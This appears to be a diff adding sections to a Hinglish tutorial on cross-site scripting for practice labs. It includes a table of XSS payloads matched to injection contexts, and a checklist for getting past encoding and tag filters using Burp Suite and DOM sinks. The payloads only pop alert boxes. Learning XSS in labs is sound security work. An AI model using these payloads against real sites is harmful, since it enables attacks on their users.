@@ -120,3 +120,46 @@ Example Payload:
 Match context → fire payload
 
 ---
+
+### Step 9: Real World Payloads
+
+| Situation              | Try This                                    |
+| ---------------------- | ------------------------------------------- |
+| Input inside HTML      | `<img src=x onerror=alert(1)>`              |
+| Input inside attribute | `" onmouseover=alert(1) x="`                |
+| JS block               | `';alert(1);//`                             |
+| Input in URL           | `javascript:alert(1)`                       |
+| Tag blocked            | `<svg/onload=alert(1)>`                     |
+| CSP enabled            | `<iframe srcdoc=...>` or use event chaining |
+
+---
+
+### ✅ Step 10: Jab Lab Naa Ho Solve — Yeh Checklist Follow Kar
+
+Input reflect ho rahi hai?
+→ Agar nahi: Encode karke try karo, Burp mein send karo
+
+Kis tag ke andar jaa rahi hai?
+→ ```<div>, href="", src="",``` etc. → us context ka payload use karo
+
+Encoding ho rahi hai?
+→ Try encoded payload ```(%3Cscript%3Ealert(1)%3C/script%3E)```
+
+Tag blocked hai?
+→ Use: ```<svg>, <math>, <iframe srcdoc=...>,``` ```onerror, onfocus, autofocus, tabindex```
+
+Browser inspect element open karo
+→ Dekho input kahan gaya hai → wahi context hit karo
+
+BurpSuite repeater mein input daal ke dekho
+→ Reflect ho raha hai ya nahi
+
+DOM XSS lag raha?
+→ Check karo: location, hash, document.write, innerHTML
+
+Alert nahi aaya to server-side encode kar raha?
+→ Base64, URL encode, HTML entity detect kar
+
+💡 Final Hacker Line:
+"XSS koi ek payload ka game nahi — ye context, reflection aur browser behavior ka full formula hai.
+Jahan ye tino mil gaye — wahan XSS guaranteed hai."
